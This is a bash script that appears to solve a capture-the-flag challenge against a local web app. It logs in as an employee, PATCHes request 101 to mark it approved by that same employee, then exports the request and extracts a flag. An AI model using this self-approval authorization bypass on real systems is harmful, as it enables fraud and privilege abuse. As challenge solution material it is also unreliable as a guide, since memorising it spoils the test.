#!/usr/bin/env bash
set -euo pipefail

HOST="http://localhost:8083"

TOKEN=$(curl -sf -X POST "$HOST/login" -H "Content-Type: application/json" \
  -d '{"user": "employee-1"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")

curl -sf -X PATCH "$HOST/requests/101" \
  -H "X-Auth-Token: $TOKEN" -H "Content-Type: application/json" \
  -d '{"status": "approved", "approved_by": "employee-1"}' > /dev/null

RESPONSE=$(curl -sf "$HOST/requests/101/export" -H "X-Auth-Token: $TOKEN")
echo "$RESPONSE"

FLAG=$(echo "$RESPONSE" | python3 -c "import json,sys;print(json.load(sys.stdin).get('flag',''))")
echo "$FLAG"
